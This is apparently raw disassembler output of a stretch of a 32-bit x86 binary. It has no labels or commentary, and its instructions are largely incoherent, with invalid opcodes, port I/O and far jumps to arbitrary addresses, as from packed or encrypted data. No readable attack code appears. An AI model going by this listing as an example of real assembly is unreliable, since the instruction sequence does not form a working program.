  40e730:	not    edi
  40e732:	jge    0x40e6c5
  40e734:	cmp    BYTE PTR [edi-0xe1700e9],dl
  40e73a:	push   ecx
  40e73b:	shl    ah,cl
  40e73d:	pop    ecx
  40e73e:	clc    
  40e73f:	mov    eax,eax
  40e741:	sub    al,0xe0
  40e743:	repz lahf 
  40e745:	clc    
  40e746:	ret    0xd40e
  40e749:	out    dx,al
  40e74a:	gs icebp 
  40e74c:	mov    gs:0xd7e39af6,al
  40e752:	cmp    BYTE PTR [ebp-0x5ce7f5db],cl
  40e758:	jns    0x40e772
  40e75a:	sbb    al,0x5
  40e75c:	or     eax,0xfea6aa5d
  40e761:	or     BYTE PTR [ebp+0x6eff20ae],cl
  40e767:	xchg   esp,eax
  40e768:	jg     0x40e7b0
  40e76a:	pusha  
  40e76b:	call   0x4cbdf3c5
  40e770:	jle    0x40e746
  40e772:	shl    ebx,cl
  40e774:	stc    
  40e775:	dec    edi
  40e776:	mov    ah,0x6
  40e778:	xchg   ebx,eax
  40e779:	pop    ebx
  40e77a:	mov    ch,0x75
  40e77c:	lea    edi,[ecx+esi*2]
  40e77f:	test   BYTE PTR [esi+0x7f],dh
  40e782:	out    dx,al
  40e783:	fsubr  DWORD PTR gs:[ebx+0x42]
  40e787:	adc    ebx,DWORD PTR [esi-0x2f]
  40e78a:	and    eax,DWORD PTR [eax]
  40e78c:	(bad)  
  40e78d:	mov    ebp,0x658e334f
  40e792:	jmp    0x40e75d
  40e794:	bound  esp,QWORD PTR [edx+eax*2+0x79]
  40e798:	push   0xffffff96
  40e79a:	push   edi
  40e79b:	(bad)  
  40e79d:	outs   dx,DWORD PTR ds:[esi]
  40e79e:	ins    DWORD PTR es:[edi],dx
  40e79f:	sub    DWORD PTR [esi],0x77
  40e7a2:	or     al,0x4c
  40e7a4:	mov    ah,0x17
  40e7a6:	mov    ah,0xba
  40e7a8:	or     DWORD PTR [eax+esi*2+0x26a7946b],edi
  40e7af:	mov    bh,0xf3
  40e7b1:	lods   eax,DWORD PTR ds:[esi]
  40e7b2:	mov    ah,0x7f
  40e7b4:	pop    edi
  40e7b5:	aam    0xfc
  40e7b7:	fidiv  DWORD PTR [esi-0x34]
  40e7ba:	in     eax,0x25
  40e7bc:	enter  0xdf6,0x36
  40e7c0:	jmp    0xcc3acb3b
  40e7c5:	(bad)  
  40e7c6:	idiv   BYTE PTR [edx+0x4970d8b6]
  40e7cc:	push   edi
  40e7cd:	outs   dx,BYTE PTR ds:[esi]
  40e7ce:	mov    bl,0xee
  40e7d0:	jbe    0x40e769
  40e7d2:	call   0xe344d2df
  40e7d7:	inc    ecx
  40e7d8:	jae    0x40e772
  40e7da:	sbb    al,0x16
  40e7dc:	lds    ebx,FWORD PTR [ebx+0x17]
  40e7df:	push   es
  40e7e0:	(bad)  
  40e7e2:	mov    ds,WORD PTR [esi]
  40e7e4:	xchg   BYTE PTR [edi+0x6f705edc],ch
  40e7ea:	scas   eax,DWORD PTR es:[edi]
  40e7eb:	dec    eax
  40e7ec:	adc    BYTE PTR [ecx+edx*2+0x49],cl
  40e7f0:	jne    0x40e808
  40e7f2:	mov    ah,0xe0
  40e7f4:	inc    ebp
  40e7f5:	mov    bl,0x93
  40e7f7:	test   al,0x23
  40e7f9:	iret   
  40e7fa:	push   edx
  40e7fb:	iret   
  40e7fc:	xchg   edi,eax
  40e7fd:	nop
  40e7fe:	xchg   ebx,eax
  40e7ff:	jg     0x40e7c2
  40e801:	dec    edi
  40e802:	push   edi
  40e803:	sbb    cl,ch
  40e805:	add    al,0x7c
  40e807:	mov    WORD PTR [esi-0x12],ss
  40e80a:	sub    bh,BYTE PTR [esp+ebx*8+0x9]
  40e80e:	(bad)  
  40e80f:	in     eax,0xc9
  40e811:	cs test al,0x16
  40e814:	std    
  40e815:	push   0xffffffff
  40e817:	or     ah,BYTE PTR [ebx+0x7206bd6]
  40e81d:	js     0x40e89a
  40e81f:	push   ss
  40e820:	jno    0x40e81c
  40e822:	pop    edx
  40e823:	jecxz  0x40e7f0
  40e825:	pop    esp
  40e826:	out    dx,eax
  40e827:	daa    
  40e828:	sbb    DWORD PTR [edi+ecx*4],ebp
  40e82b:	push   eax
  40e82c:	ret    
  40e82d:	push   ds
  40e82e:	sub    bh,BYTE PTR [ebx+esi*2+0x15410848]
  40e835:	out    0x22,al
  40e837:	pop    ss
  40e838:	pop    ebp
  40e839:	push   0x9f407785
  40e83e:	mov    ch,0xd4
  40e840:	sbb    BYTE PTR [edx+0x50fe0340],bl
  40e846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e847:	push   0x7e80072
  40e84c:	nop
  40e84d:	push   edi
  40e84e:	xchg   ebx,eax
  40e84f:	mov    ah,0xbb
  40e851:	add    dh,bl
  40e853:	stos   BYTE PTR es:[edi],al
  40e854:	push   edx
  40e855:	or     dh,bl
  40e857:	adc    eax,0xa75ec3db
  40e85c:	lds    ecx,FWORD PTR [eax+0x41]
  40e85f:	mov    edx,0x3a51df98
  40e864:	fnsave [esi-0x28]
  40e867:	std    
  40e868:	or     al,0x94
  40e86a:	dec    ecx
  40e86b:	cmp    DWORD PTR [ebp+0x1b7295f8],ecx
  40e871:	xlat   BYTE PTR ds:[ebx]
  40e872:	xchg   BYTE PTR [eax+0xff801e2],dl
  40e878:	ror    BYTE PTR [edi-0x35],1
  40e87b:	push   cs
  40e87c:	adc    BYTE PTR [eax],al
  40e87e:	sti    
  40e87f:	retf   
  40e880:	(bad)
  40e884:	mov    edi,0x419add68
  40e889:	aas    
  40e88a:	push   0xffffffaf
  40e88c:	sar    DWORD PTR [esi],0x75
  40e88f:	fdiv   st(0),st
  40e891:	test   eax,eax
  40e893:	test   DWORD PTR [eax],0x8ee5be41
  40e899:	sbb    BYTE PTR [edx+0x7],0x85
  40e89d:	sub    bl,BYTE PTR [ebp+0x62770ff3]
  40e8a3:	ds popf 
  40e8a5:	out    dx,al
  40e8a6:	hlt    
  40e8a7:	pushf  
  40e8a8:	(bad)  
  40e8a9:	jae    0x40e89e
  40e8ab:	inc    edi
  40e8ac:	neg    DWORD PTR [esp+ebp*1-0x1cac5f6b]
  40e8b3:	dec    ecx
  40e8b4:	add    BYTE PTR [ebp+0x25],bh
  40e8b7:	xor    al,0x21
  40e8b9:	cmp    BYTE PTR [edi+edx*4],bh
  40e8bc:	or     al,0xb7
  40e8be:	push   esi
  40e8bf:	shr    bh,cl
  40e8c1:	rcr    edx,1
  40e8c3:	cmp    al,0x6b
  40e8c5:	fmul   st(5),st
  40e8c7:	xchg   edi,eax
  40e8c8:	xchg   esi,eax
  40e8c9:	push   0x2b30dac4
  40e8ce:	add    edi,ecx
  40e8d0:	mov    bl,0x31
  40e8d2:	retf   0xa8ff
  40e8d5:	sbb    eax,ebx
  40e8d7:	dec    esp
  40e8d8:	jge    0x40e8eb
  40e8da:	popf   
  40e8db:	and    bh,BYTE PTR [edi+0x7e]
  40e8de:	adc    cl,al
  40e8e0:	mov    ch,0x5b
  40e8e2:	inc    eax
  40e8e3:	ins    DWORD PTR es:[edi],dx
  40e8e4:	and    eax,0xcfd35915
  40e8e9:	dec    ebx
  40e8ea:	cdq    
  40e8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8ec:	and    DWORD PTR [edi-0x857bc41],esi
  40e8f2:	sar    DWORD PTR [ebp+esi*8-0x417ac0da],1
  40e8f9:	jmp    0x40e926
  40e8fb:	mov    ch,0xeb
  40e8fd:	fisttp QWORD PTR [edx]
  40e8ff:	dec    esi
  40e900:	pop    eax
  40e901:	(bad)  
  40e902:	jmp    0x40e891
  40e904:	pop    ebx
  40e905:	jl     0x40e938
  40e907:	cmp    bl,BYTE PTR [edx-0x29]
  40e90a:	inc    ecx
  40e90b:	mov    dh,BYTE PTR [edi]
  40e90d:	leave  
  40e90e:	sbb    dl,BYTE PTR [edi-0x27c4a46a]
  40e914:	mov    cl,0x42
  40e916:	in     al,dx
  40e917:	jmp    0x801a:0x5a0ebba2
  40e91e:	pop    ecx
  40e91f:	push   esp
  40e920:	in     eax,0x39
  40e922:	mov    edi,ebx
  40e924:	bound  eax,QWORD PTR [eax+0x54ae14aa]
  40e92a:	mov    ecx,0x50096749
  40e92f:	stos   DWORD PTR es:[edi],eax
  40e930:	lods   al,BYTE PTR ds:[esi]
  40e931:	not    BYTE PTR [eax+0x38215dd2]
  40e937:	jmp    0xf8d1:0x36ee55af
  40e93e:	push   edx
  40e93f:	cwde   
  40e940:	lods   eax,DWORD PTR ds:[esi]
  40e941:	jge    0x40e98e
  40e943:	jge    0x40e8e3
  40e945:	mov    eax,0x8a552386
  40e94a:	ss adc al,0x2d
  40e94d:	addr16 clc 
  40e94f:	call   0x5fc7ac57
  40e954:	mov    ds:0xd852e51a,al
  40e959:	mov    BYTE PTR [ecx+ebx*8+0x74],al
  40e95d:	test   eax,0x704b9d84
  40e962:	in     al,0xab
  40e964:	adc    esi,DWORD PTR [edx]
  40e966:	jmp    FWORD PTR fs:[ebx-0x30]
  40e96a:	cli    
  40e96b:	fild   QWORD PTR [edi]
  40e96d:	mov    ebp,0x2150adfe
  40e972:	imul   ecx
  40e974:	jg     0x40e927
  40e976:	sahf   
  40e977:	shl    DWORD PTR [eax],0xaa
  40e97a:	sbb    eax,0xe5bb6e4f
  40e97f:	jo     0x40e930
  40e981:	test   DWORD PTR [eax-0x2],ecx
  40e984:	fwait
  40e985:	jecxz  0x40e9a7
  40e987:	inc    esi
  40e988:	imul   esi,DWORD PTR [edx+esi*4],0xffffffe4
  40e98c:	cld    
  40e98d:	mov    ecx,0x71012349
  40e992:	mov    bl,0xa5
  40e994:	in     al,0x78
  40e996:	into   
  40e997:	je     0x40e964
  40e999:	xchg   ebp,eax
  40e99a:	push   ss
  40e99b:	lods   al,BYTE PTR ds:[esi]
  40e99c:	sbb    ch,BYTE PTR [esi-0x74]
  40e99f:	sub    al,0x79
  40e9a1:	push   esp
  40e9a2:	cld    
  40e9a3:	xor    bh,ah
  40e9a5:	sub    cl,cl
  40e9a7:	or     eax,0x650788c0
  40e9ac:	adc    ebx,ebp
  40e9ae:	or     al,0xb7
  40e9b0:	loope  0x40e981
  40e9b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9b3:	fs or  al,0xc4
  40e9b6:	fnsave [esi+0x583ad2ed]
  40e9bc:	push   ebp
  40e9bd:	inc    eax
  40e9be:	in     al,0x1d
  40e9c0:	out    dx,al
  40e9c1:	sub    BYTE PTR [ebx-0x5500d3a8],0xa4
  40e9c8:	jbe    0x40e99e
  40e9ca:	sahf   
  40e9cb:	add    al,0x8e
  40e9cd:	rol    BYTE PTR [esi-0x30],1
  40e9d0:	sub    BYTE PTR [edx-0x2e502b3c],dh
  40e9d6:	mov    BYTE PTR [edi-0x23],bh
  40e9d9:	or     DWORD PTR [edi],0xc60b7d79
  40e9df:	or     BYTE PTR [eax-0x30],0x39
  40e9e3:	adc    DWORD PTR [edi],esp
  40e9e5:	mov    ah,0xae
  40e9e7:	adc    DWORD PTR [eax],ecx
  40e9e9:	dec    edi
  40e9ea:	add    DWORD PTR [eax+esi*8],eax
  40e9ed:	xor    al,0x47
  40e9ef:	xchg   edi,eax
  40e9f0:	jge    0x40e99e
  40e9f2:	push   edx
  40e9f3:	in     eax,dx
  40e9f4:	adc    eax,DWORD PTR [ebx]
  40e9f6:	repnz push ebx
  40e9f8:	adc    eax,edi
  40e9fa:	sbb    eax,0xff273449
  40e9ff:	call   0xe62c:0xaf225aee
  40ea06:	std    
  40ea07:	aaa    
  40ea08:	jnp    0x40ea75
  40ea0a:	and    BYTE PTR [ebp-0x37c49b4b],bl
  40ea10:	xor    BYTE PTR [esi-0x705bfc8f],bh
  40ea16:	jbe    0x40e9f1
  40ea18:	mov    WORD PTR [eax-0x6c],ss
  40ea1b:	push   0x84a59271
  40ea20:	outs   dx,BYTE PTR ds:[esi]
  40ea21:	mov    WORD PTR [eax],ss
  40ea23:	shl    esi,0x34
  40ea26:	or     ebp,esi
  40ea28:	xchg   ebx,eax
  40ea29:	or     eax,DWORD PTR [ebx-0x61f4c2db]
  40ea2f:	inc    esi
  40ea30:	dec    eax
  40ea31:	mov    cl,BYTE PTR [ebp+0x616f28f7]
  40ea37:	addr16 mov ebp,0xd3c79e3d
  40ea3d:	push   0xffffffa5
  40ea3f:	or     eax,DWORD PTR [edi]
  40ea41:	out    dx,eax
  40ea42:	sbb    al,0x61
  40ea44:	pop    es
  40ea45:	sub    al,0xcf
  40ea47:	fsub   DWORD PTR [edi]
  40ea49:	push   DWORD PTR [ebp-0x76]
  40ea4c:	das    
  40ea4d:	mov    cl,0x92
  40ea4f:	add    BYTE PTR [edi+eax*1+0x11075fe1],al
  40ea56:	ins    BYTE PTR es:[edi],dx
  40ea57:	mov    ah,BYTE PTR [ebx+ecx*8-0x6c]
  40ea5b:	pusha  
  40ea5c:	aam    0x30
  40ea5e:	fisttp DWORD PTR [ebp-0x42]
  40ea61:	mov    gs,ebx
  40ea63:	(bad)  
  40ea64:	add    edx,DWORD PTR es:[edi+0x17e1893a]
  40ea6b:	popf   
  40ea6c:	mov    ah,0xa
  40ea6e:	loop   0x40e9fc
  40ea70:	push   es
  40ea71:	push   esi
  40ea72:	cmp    ch,bh
  40ea74:	out    0x51,eax
  40ea76:	sub    al,0x38
  40ea78:	pop    es
  40ea79:	push   esi
  40ea7a:	and    al,0x44
  40ea7c:	sbb    dl,al
  40ea7e:	leave  
  40ea7f:	jno    0x40ea80
  40ea81:	ret    
  40ea82:	jecxz  0x40ea06
  40ea84:	out    dx,eax
  40ea85:	scas   al,BYTE PTR es:[edi]
  40ea86:	test   BYTE PTR [edi-0xfc7d6a7],bh
  40ea8c:	fst    st(7)
  40ea8e:	inc    edx
  40ea8f:	pop    esi
  40ea90:	outs   dx,DWORD PTR ds:[esi]
  40ea91:	dec    ecx
  40ea92:	or     BYTE PTR [ecx],ah
  40ea94:	popf   
  40ea95:	jns    0x40eaf8
  40ea97:	adc    al,BYTE PTR [eax]
  40ea99:	mov    ds,WORD PTR [ebp+ebx*8+0x3a]
  40ea9d:	fwait
  40ea9e:	pop    ebp
  40ea9f:	scas   eax,DWORD PTR es:[edi]
  40eaa0:	add    BYTE PTR [edx],ch
  40eaa2:	fucomi st,st(2)
  40eaa4:	sub    DWORD PTR [ebp-0x66bbb889],edx
  40eaaa:	mul    esp
  40eaac:	scas   al,BYTE PTR es:[edi]
  40eaad:	xchg   ecx,eax
  40eaae:	out    0x2f,al
  40eab0:	mov    eax,0x732270b6
  40eab5:	lea    ebp,[edx]
  40eab7:	and    eax,0x27361a09
  40eabc:	adc    DWORD PTR [edx],ebp
  40eabe:	lea    ebx,[edi]
  40eac0:	push   esi
  40eac1:	nop
  40eac2:	fwait
  40eac3:	rcr    BYTE PTR [ecx+0x21],0x76
  40eac7:	nop    DWORD PTR [edx+0x2207e67a]
  40eace:	test   eax,0x93eb426b
  40ead3:	xor    ecx,DWORD PTR [edi+eiz*8+0x8919945]
  40eada:	cmc    
  40eadb:	jl     0x40eb0f
  40eadd:	lock mov edx,0x6d19a21e
  40eae3:	jge    0x40eab9
  40eae5:	das    
  40eae6:	in     eax,dx
  40eae7:	sbb    al,0x17
  40eae9:	or     ebp,DWORD PTR [eax]
  40eaeb:	hlt    
  40eaec:	lea    ecx,[ecx-0x409cdca5]
  40eaf2:	fld    DWORD PTR [edx]
  40eaf4:	mov    esp,DWORD PTR [edi+0x46]
  40eaf7:	and    eax,0x8539a834
  40eafc:	mov    ds:0xf478dbac,eax
  40eb01:	out    dx,al
  40eb02:	sahf   
  40eb03:	xor    eax,0xd6d411cb
  40eb08:	test   BYTE PTR [edi-0x1e],dh
  40eb0b:	test   al,0x98
  40eb0d:	gs mov ah,0xc5
  40eb10:	cmp    DWORD PTR ds:0xb2167b71,ebp
  40eb16:	mov    esp,0x42181ceb
  40eb1b:	daa    
  40eb1c:	scas   al,BYTE PTR es:[edi]
  40eb1d:	jnp    0x40eb8d
  40eb1f:	push   edx
  40eb20:	mov    dl,0x88
  40eb22:	popf   
  40eb23:	arpl   WORD PTR [edx],bx
  40eb25:	in     eax,0x3a
  40eb27:	in     al,0xbd
  40eb29:	mov    dl,0x39
  40eb2b:	inc    edi
  40eb2c:	inc    edi
  40eb2d:	sbb    ebx,DWORD PTR ds:0x96feb10f
  40eb33:	fbld   TBYTE PTR [ecx+0x21]
  40eb36:	push   esi
  40eb37:	lods   al,BYTE PTR ds:[esi]
  40eb38:	adc    esi,eax
  40eb3a:	fs loop 0x40eae9
  40eb3d:	cli    
  40eb3e:	(bad)  
  40eb3f:	lahf   
  40eb40:	jae    0x40eadb
  40eb42:	cmp    BYTE PTR [bp+di],bl
  40eb45:	imul   BYTE PTR [edi-0x4a597b1f]
  40eb4b:	mov    bl,0xda
  40eb4d:	add    DWORD PTR [esi+ecx*4+0x77],0x27
  40eb52:	in     al,dx
  40eb53:	dec    edx
  40eb54:	xchg   DWORD PTR [edx-0x648378e9],eax
  40eb5a:	test   cl,dl
  40eb5c:	cmp    BYTE PTR [ebx+0x17],cl
  40eb5f:	das    
  40eb60:	push   ss
  40eb61:	mov    ds:0x565e847b,eax
  40eb66:	or     dl,BYTE PTR [esi+0x59]
  40eb69:	jp     0x40eb59
  40eb6b:	stc    
  40eb6c:	cmp    DWORD PTR [edx+0x39],edi
  40eb6f:	dec    esi
  40eb70:	cmp    bh,bh
  40eb72:	sti    
  40eb73:	mov    esp,0x912f0941
  40eb78:	cld    
  40eb79:	hlt    
  40eb7a:	or     ebp,ebx
  40eb7c:	mov    gs:0xe6e29ee4,eax
  40eb82:	cld    
  40eb83:	call   0xd4dd:0x8e492755
  40eb8a:	xor    bh,BYTE PTR [edx]
  40eb8c:	xor    BYTE PTR [eax-0x2017d419],ah
  40eb92:	test   eax,0x93249aae
  40eb97:	out    dx,eax
  40eb98:	fs pop esi
  40eb9a:	add    dl,dh
  40eb9c:	out    dx,al
  40eb9d:	test   BYTE PTR [ecx+0x298832df],0x39
  40eba4:	iret   
  40eba5:	retf   
  40eba6:	retf   0x8258
  40eba9:	push   DWORD PTR [edx+0x7fd09aa7]
  40ebaf:	pop    ds
  40ebb0:	push   ss
  40ebb1:	int3   
  40ebb2:	jne    0x40ebe4
  40ebb4:	xchg   ebx,eax
  40ebb5:	mov    al,0x4c
  40ebb7:	push   ss
  40ebb8:	mov    ah,dl
  40ebba:	iret   
  40ebbb:	das    
  40ebbc:	dec    edx
  40ebbd:	call   0x834b:0x7d1cd17d
  40ebc4:	aam    0x9c
  40ebc6:	aas    
  40ebc7:	outs   dx,BYTE PTR ds:[esi]
  40ebc8:	fs inc ebp
  40ebca:	mov    ebx,0xd89f7d63
  40ebcf:	div    DWORD PTR [esi-0x5e]
  40ebd2:	jge    0x40ebf0
  40ebd4:	sbb    ecx,esp
  40ebd6:	iret   
  40ebd7:	dec    edi
  40ebd8:	push   0xa3254fd
  40ebdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebde:	sti    
  40ebdf:	sbb    eax,0xd1d0781f
  40ebe4:	fdivr  DWORD PTR [edx+0x77]
  40ebe8:	mov    eax,0x614dfbda
  40ebed:	dec    eax
  40ebee:	xchg   DWORD PTR [edx+ecx*4+0x477a09d8],esp
  40ebf5:	shr    DWORD PTR [esi+edi*2],1
  40ebf8:	sub    DWORD PTR [edi-0x1cc16623],0xc147c96e
  40ec02:	inc    edi
  40ec03:	mov    esp,0xad8e9b13
  40ec08:	pop    eax
  40ec09:	lds    edi,FWORD PTR [eax-0x59]
  40ec0c:	arpl   WORD PTR [ecx-0x4e9f1111],bx
  40ec12:	jae    0x40ec8a
  40ec14:	and    ebx,eax
  40ec16:	push   ds
  40ec17:	push   edx
  40ec18:	pusha  
  40ec19:	dec    ebp
  40ec1b:	pusha  
  40ec1c:	mov    cl,0x90
  40ec1e:	jns    0x40ebfe
  40ec20:	aas    
  40ec21:	fidiv  WORD PTR [edx+0x5e]
  40ec24:	les    bx,DWORD PTR [esi]
  40ec27:	test   BYTE PTR [esp+ebp*1-0x72],ah
  40ec2b:	dec    eax
  40ec2c:	pop    ebp
  40ec2d:	cdq    
  40ec2e:	sub    BYTE PTR [ebp-0x1e280729],0x90
  40ec35:	pop    DWORD PTR [ebp-0x5f13b80b]
  40ec3b:	call   0x15df:0x3809262d
  40ec42:	imul   edi,DWORD PTR [esi+0x543625e4],0xb56f2bd5
  40ec4c:	and    edi,DWORD PTR [ebx+0x348ffb95]
  40ec52:	(bad)  
  40ec53:	imul   ebx,DWORD PTR [eax+edi*1],0xffffffe3
  40ec57:	dec    eax
  40ec58:	or     ecx,DWORD PTR [edi+0x65]
  40ec5b:	mov    esi,DWORD PTR [edx-0x5]
  40ec5e:	lods   eax,DWORD PTR ds:[esi]
  40ec5f:	cmp    DWORD PTR [ecx],eax
  40ec61:	inc    ebp
  40ec62:	or     BYTE PTR [eax+0x6e],dl
  40ec65:	or     dl,BYTE PTR [edi+edx*8-0x342d9436]
  40ec6c:	lods   al,BYTE PTR ds:[esi]
  40ec6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec6e:	aad    0xdd
  40ec70:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40ec72:	rcl    DWORD PTR [ecx+ebp*2-0x4cb15a83],cl
  40ec79:	push   ebp
  40ec7a:	push   es
  40ec7b:	call   0x449d3ab3
  40ec80:	shl    BYTE PTR [ebp-0x56411f2a],1
  40ec86:	frstor [edi-0x222522c]
  40ec8c:	mov    dl,0x1f
  40ec8e:	mov    edi,0x53396f89
  40ec93:	pop    eax
  40ec94:	push   esp
  40ec95:	dec    ebp
  40ec96:	imul   edx,DWORD PTR [ecx],0x4d
  40ec99:	or     DWORD PTR [ecx+0x6a66391],0x5a73ab40
  40eca3:	outs   dx,BYTE PTR ds:[esi]
  40eca4:	sbb    DWORD PTR [ecx],esp
  40eca6:	inc    esp
  40eca7:	push   esi
  40eca8:	cmp    BYTE PTR [esi],cl
  40ecaa:	test   DWORD PTR [edi],edi
  40ecac:	into   
  40ecad:	adc    eax,0x489657d1
  40ecb2:	lods   al,BYTE PTR ds:[esi]
  40ecb3:	and    al,0xe3
  40ecb5:	sub    BYTE PTR [esi],0xad
  40ecb8:	or     al,0xe7
  40ecba:	in     al,0x84
  40ecbc:	shl    DWORD PTR fs:[eax-0xc],cl
  40ecc0:	mov    ds,WORD PTR ds:0xd25e956
  40ecc6:	and    edx,DWORD PTR [edx+0x4a]
  40ecc9:	cmc    
  40ecca:	add    bh,BYTE PTR [esi-0x7681c886]
  40ecd0:	lea    esi,[ecx]
  40ecd2:	and    DWORD PTR [ebp+0x615481e6],edi
  40ecd8:	jbe    0x40ec67
  40ecda:	or     ecx,DWORD PTR [ebp-0x1d]
  40ecdd:	retf   
  40ecde:	daa    
  40ecdf:	gs in  al,0x14
  40ece2:	jle    0x40ece7
  40ece4:	stc    
  40ece5:	pop    ebx
  40ece6:	call   0xe20f:0xcdc4a4d3
  40eced:	add    esi,DWORD PTR [esp+eiz*8]
  40ecf0:	pop    ds
  40ecf1:	pop    edi
  40ecf2:	test   eax,0x34e65b0d
  40ecf7:	add    al,0xc7
  40ecf9:	adc    al,0x60
  40ecfb:	xlat   BYTE PTR ds:[ebx]
  40ecfc:	cmp    bl,dh
  40ecfe:	pop    es
  40ecff:	test   BYTE PTR [edx-0x2b],0x67
  40ed03:	sbb    eax,edx
  40ed05:	out    0x77,eax
  40ed07:	cwde   
  40ed08:	jne    0x40ecf8
  40ed0a:	add    edx,DWORD PTR [eax-0x7a87e1a]
  40ed10:	cdq    
  40ed11:	jg     0x40ecd6
  40ed13:	mov    ds:0x2ce8072c,al
  40ed18:	int3   
  40ed19:	xor    DWORD PTR [esi-0x6c9afc5d],ebx
  40ed1f:	mov    ebx,fs
  40ed21:	xchg   ecx,eax
  40ed22:	sbb    eax,0x6a462bf2
  40ed27:	sub    DWORD PTR [ecx-0x7ebb579c],edi
  40ed2d:	cmp    DWORD PTR [ecx-0x10],ebx
  40ed30:	or     al,0x4f
  40ed32:	push   eax
  40ed33:	adc    BYTE PTR [ebx-0x31],0x1
  40ed37:	ins    DWORD PTR es:[edi],dx
  40ed38:	mov    bl,0x9e
  40ed3a:	fcomp  DWORD PTR [eax-0x7146739c]
  40ed40:	xor    al,0xd2
  40ed42:	dec    ecx
  40ed43:	in     al,dx
  40ed44:	jl     0x40edc5
  40ed46:	pop    ds
  40ed47:	scas   al,BYTE PTR es:[edi]
  40ed48:	sub    edx,DWORD PTR [ebp+0x5818ab87]
  40ed4e:	cli    
  40ed4f:	cmp    eax,0x1794e60e
  40ed54:	pop    edx
  40ed55:	mov    es,WORD PTR [ebp-0x2920bf80]
  40ed5b:	inc    esp
  40ed5c:	mov    DWORD PTR [ecx+0x68216a5a],ebx
  40ed62:	push   ss
  40ed63:	fsub   DWORD PTR [edx]
  40ed65:	sbb    edi,DWORD PTR [edi+0xd]
  40ed68:	mov    DWORD PTR [edx+eax*4-0x42],esi
  40ed6c:	jmp    0x40ed82
  40ed6e:	ret    
  40ed6f:	pop    ebx
  40ed70:	int    0x8
  40ed72:	jbe    0x40ed42
  40ed74:	gs push eax
  40ed76:	and    dh,cl
  40ed78:	js     0x40ed8b
  40ed7a:	aas    
  40ed7b:	sbb    DWORD PTR [esi],ebp
  40ed7d:	jne    0x40ed87
  40ed7f:	mov    BYTE PTR [edx+0x15150017],0x6d
  40ed86:	shl    DWORD PTR [ecx-0x7c],cl
  40ed89:	push   edx
  40ed8a:	push   ss
  40ed8b:	jo     0x40edd4
  40ed8d:	loope  0x40edc6
  40ed8f:	rcr    BYTE PTR [esi+0x76],1
  40ed92:	push   esi
  40ed93:	add    eax,0x436d2817
  40ed98:	pop    ecx
  40ed99:	loope  0x40ede8
  40ed9b:	ins    BYTE PTR es:[edi],dx
  40ed9c:	xchg   DWORD PTR [edx-0x2e],ebx
  40ed9f:	xor    bl,dl
  40eda1:	aam    0x65
  40eda3:	mov    ecx,ss
  40eda5:	repz retf 
  40eda7:	nop
  40eda8:	les    ecx,FWORD PTR [edi+edi*1+0x7cec172a]
  40edaf:	daa    
  40edb0:	(bad)  
  40edb1:	sti    
  40edb2:	sbb    al,0x8c
  40edb4:	pop    ebx
  40edb5:	jnp    0x40edfa
  40edb7:	cmp    BYTE PTR [edi+ebp*4],ah
  40edba:	push   edi
  40edbb:	mov    bl,0x14
  40edbd:	sub    DWORD PTR [edi-0x4],ebx
  40edc0:	fdivr  st,st(4)
  40edc2:	aaa    
  40edc3:	clc    
  40edc4:	or     ecx,esp
  40edc6:	(bad)  
  40edc7:	dec    ecx
  40edc8:	loop   0x40ed8d
  40edca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edcb:	cwde   
  40edcc:	jecxz  0x40eda6
  40edce:	stos   DWORD PTR es:[edi],eax
  40edcf:	retf   
  40edd0:	out    dx,eax
  40edd1:	sub    esp,DWORD PTR [edi-0x2d923ea8]
  40edd7:	inc    edi
  40edd8:	cmp    DWORD PTR [edi],ebp
  40edda:	jle    0x40ee27
  40eddc:	repz cmp edx,esi
  40eddf:	ss add al,dl
  40ede2:	add    ebp,DWORD PTR [eax]
  40ede4:	mov    bl,0x63
  40ede6:	dec    edx
  40ede7:	fist   WORD PTR [eax+0x71]
  40edea:	inc    eax
  40edeb:	std    
  40edec:	stos   BYTE PTR es:[edi],al
  40eded:	add    bl,0xf3
  40edf0:	fbstp  TBYTE PTR [edi+0x5f60a912]
  40edf6:	mov    bl,0x35
  40edf8:	xor    DWORD PTR [edi-0x1c],ebx
  40edfb:	push   ebp
  40edfc:	aas    
  40edfd:	popf   
  40edfe:	addr16 mov dh,0x7c
  40ee01:	adc    DWORD PTR [ebp-0x46d04201],esp
  40ee07:	mov    eax,ds:0x6f2ddb5
  40ee0c:	push   eax
  40ee0d:	mov    ds:0x88e02ebe,eax
  40ee12:	imul   edi,DWORD PTR [edi+0x32ba840],0x39a24b3a
  40ee1c:	inc    edx
  40ee1d:	fsubr  st,st(0)
  40ee1f:	cmp    cl,BYTE PTR fs:[edx-0x67]
  40ee23:	or     BYTE PTR [ebp-0x3049aaec],al
  40ee29:	outs   dx,BYTE PTR ds:[esi]
  40ee2a:	inc    esi
  40ee2b:	call   0xf48a3904
  40ee30:	mov    ebp,0x367cd943
  40ee35:	adc    edx,0x29be0058
  40ee3b:	jecxz  0x40ee1c
  40ee3d:	ror    BYTE PTR [edi+0x6b610147],0x85
  40ee44:	and    cl,BYTE PTR [eax+edi*8-0x7ecdcf36]
  40ee4b:	mov    ch,0x93
  40ee4d:	jecxz  0x40ede7
  40ee4f:	jb     0x40ee40
  40ee51:	sub    eax,0xcc7a98aa
  40ee56:	and    DWORD PTR [edi],ebx
  40ee58:	rol    dh,cl
  40ee5a:	lock shl bh,0x9a
  40ee5e:	imul   edx,DWORD PTR [eax+0x1b81bbf0],0x54
  40ee65:	sub    edx,DWORD PTR [ebx+eax*2+0x25fb4d5a]
  40ee6c:	cmp    al,0x10
  40ee6e:	jmp    0xef1eaca4
  40ee73:	jle    0x40ee16
  40ee75:	mov    cl,0xf3
  40ee77:	pushf  
  40ee78:	lds    edx,FWORD PTR [eax]
  40ee7a:	add    eax,0x78cdb079
  40ee7f:	loop   0x40ee26
  40ee81:	out    0x2,eax
  40ee83:	int3   
  40ee84:	mov    bl,0x62
  40ee86:	sub    DWORD PTR [ecx+0x48d4224a],0xffffffe0
  40ee8d:	je     0x40eea6
  40ee8f:	ror    BYTE PTR [ebx+0x6a],cl
  40ee92:	dec    edi
  40ee93:	inc    ecx
  40ee94:	cmc    
  40ee95:	pop    eax
  40ee96:	inc    ebp
  40ee97:	and    al,0xdb
